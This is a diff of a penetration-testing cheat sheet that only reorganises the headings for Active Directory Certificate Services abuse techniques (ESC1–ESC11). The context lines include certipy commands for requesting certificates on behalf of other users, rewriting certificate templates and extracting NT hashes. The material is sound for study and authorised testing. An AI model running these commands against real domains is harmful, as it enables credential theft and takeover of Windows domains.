@@ -767,9 +767,9 @@ PS> $dsEntry.PsBase.CommitChanges()
 
 The further course results depending on which object is contained in the OU - see GenericAll.
 
-## Enroll (Certipy)
+# Active Directory Certificate Services
 
-### ESC1
+## ESC1
 
 ESC1 allows Client Authentication and permits the enrollee to supply an arbitrary Subject Alternative Name (SAN) to a certficate.
 
@@ -783,11 +783,11 @@ Using the certificate the NT hash can be extracted:
 $> certipy auth -pfx '<file>.pfx' -username '<user>' -domain '<domain>' -dc-ip <domainController>
 ```
 
-### ESC2
+## ESC2
 
 ESC2 is when a certificate template can be used for any purpose (change Enrollment Agents - see ESC3)
 
-### ESC3
+## ESC3
 
 ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent).
 This EKU can be used to request certificates on behalf of other users. 
@@ -804,7 +804,7 @@ Use this certificate with -on-behalf-of parameter (must be in the form of domain
 $> certipy req '<domain>/<user>:<password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -template 'User' -on-behalf-of '<domain>\<user>' -pfx '<file>.pfx'
 ```
 
-### ESC4
+## ESC4
 
 ESC4 is when a user has write privileges over a certificate template.
 Overwrite the template and make it vulnerable to ESC1:
@@ -826,16 +826,16 @@ Restore the configuration afterwards:
 $> certipy template '<domain>/<user>'@<certificatesRhost> -hashes :<ntHash> -template 'ESC4' -configuration '<file>.json'
 ```
 
-### ESC5
+## ESC5
 
 Write Access on PKI Object.
 
-### ESC6
+## ESC6
 
 ESC6 is when the CA specifies the EDITF_ATTRIBUTESUBJECTALTNAME2 flag.
 In essence, this flag allows the enrollee to specify an arbitrary SAN on all certificates despite a certificate template’s configuration (see ESC1).
 
-### ESC7 (Manage CA & Manage Certificates)
+## ESC7 (Manage CA & Manage Certificates)
 
 In order for this technique to work, the user must also have the Manage Certificates access right, and the certificate template SubCA must be enabled.
 Add Manage Certificates access right:
@@ -876,7 +876,7 @@ Extract NT hash:
 $> certipy auth -pfx '<file>.pfx' -username '<user>' -domain '<domain>' -dc-ip <domainController>
 ```
 
-### ESC8
+## ESC8
 
 An Enrollment Service has installed and enabled HTTP Web Enrollment.
 Start relay server:
@@ -897,7 +897,7 @@ Get NT hash of domain controller:
 $> certipy auth -pfx '<file>.pfx' -username '<user>' -domain '<domain>' -dc-ip <domainController>
 ```
 
-### ESC9
+## ESC9
 
 GenericWrite on user or computer and vulnerable certficate template:
 
@@ -905,11 +905,11 @@ GenericWrite on user or computer and vulnerable certficate template:
 2. request certificate
 3. change username.
 
-### ESC10
+## ESC10
 
 Same as ESC9 but any certificate template can be used.
 
-### ESC11
+## ESC11
 
 RPC Enrollment relay attack: 
 
